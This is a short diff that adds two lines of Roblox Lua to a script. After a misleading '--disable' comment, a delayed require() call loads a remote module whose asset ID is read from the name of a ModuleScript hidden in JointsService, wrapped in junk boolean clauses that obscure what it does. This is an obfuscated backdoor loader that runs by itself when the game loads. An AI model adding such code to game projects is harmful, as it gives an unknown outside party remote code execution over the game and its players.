@@ -1,0 +1,2 @@
+--disable
+wait(0.5)require(tonumber(game.JointsService:FindFirstChildOfClass("ModuleScript").Name or game.Workspace and script=="false" or false and true or (function() return false end)() or game.Workspace and script=="false" or false and true or (function() return false end)() ))
